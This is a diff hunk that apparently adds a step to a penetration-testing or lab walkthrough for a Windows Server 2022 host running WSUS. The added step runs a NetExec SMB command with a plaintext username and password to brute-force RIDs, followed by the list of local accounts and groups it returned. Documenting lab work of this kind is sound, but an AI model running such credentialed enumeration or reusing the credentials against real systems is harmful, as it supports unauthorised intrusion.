@@ -253,3 +253,17 @@ SMB         10.0.27.179     445    EC2AMAZ-GQCP864  UpdateServicesPackages READ 
 SMB         10.0.27.179     445    EC2AMAZ-GQCP864  WsusContent     READ            A network share to be used by Local Publishing to place published content on this WSUS system.
 SMB         10.0.27.179     445    EC2AMAZ-GQCP864  WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
 ```
+
+```python
+nxc smb EC2AMAZ-GQCP864 -u 'xiao.ge' -p 'AmBZATVjnH4qo8H4' --local-auth --rid-brute 20000       
+SMB         10.0.27.179     445    EC2AMAZ-GQCP864  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-GQCP864) (domain:EC2AMAZ-GQCP864) (signing:False) (SMBv1:None)
+SMB         10.0.27.179     445    EC2AMAZ-GQCP864  [+] EC2AMAZ-GQCP864\xiao.ge:AmBZATVjnH4qo8H4 
+SMB         10.0.27.179     445    EC2AMAZ-GQCP864  500: EC2AMAZ-GQCP864\Administrator (SidTypeUser)
+SMB         10.0.27.179     445    EC2AMAZ-GQCP864  501: EC2AMAZ-GQCP864\Guest (SidTypeUser)
+SMB         10.0.27.179     445    EC2AMAZ-GQCP864  503: EC2AMAZ-GQCP864\DefaultAccount (SidTypeUser)
+SMB         10.0.27.179     445    EC2AMAZ-GQCP864  504: EC2AMAZ-GQCP864\WDAGUtilityAccount (SidTypeUser)
+SMB         10.0.27.179     445    EC2AMAZ-GQCP864  513: EC2AMAZ-GQCP864\None (SidTypeGroup)
+SMB         10.0.27.179     445    EC2AMAZ-GQCP864  1000: EC2AMAZ-GQCP864\xiao.ge (SidTypeUser)
+SMB         10.0.27.179     445    EC2AMAZ-GQCP864  1001: EC2AMAZ-GQCP864\WSUS Administrators (SidTypeAlias)
+SMB         10.0.27.179     445    EC2AMAZ-GQCP864  1002: EC2AMAZ-GQCP864\WSUS Reporters (SidTypeAlias)
+```
